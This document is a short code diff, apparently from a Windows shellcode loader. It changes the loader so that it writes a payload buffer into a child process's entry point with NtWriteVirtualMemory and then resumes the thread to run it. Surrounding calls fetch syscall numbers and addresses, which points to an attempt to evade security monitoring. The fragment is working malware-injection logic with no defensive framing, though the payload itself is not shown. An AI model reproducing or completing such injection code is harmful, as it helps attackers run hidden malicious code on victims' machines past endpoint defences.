@@ -385,6 +385,7 @@ int main()
 
         GetSyscall(syscallNum);
         GetSyscallAddr(syscallAddr);
+        PULONG byteWritten = 0;
 
         //WriteProcessMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
 
@@ -397,13 +398,13 @@ int main()
         }
         */
 
-        /*
+        
         _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
 
-        NtWriteVirtualMemory(pi.hProcess, codeEntry, buf, sizeof(buf), NULL);
+        NtWriteVirtualMemory(pi.hProcess, (PVOID)codeEntry, buf, sizeof(buf), byteWritten);
         
-        */
-        //ResumeThread(pi.hThread);
+        
+        ResumeThread(pi.hThread);
 
 
 
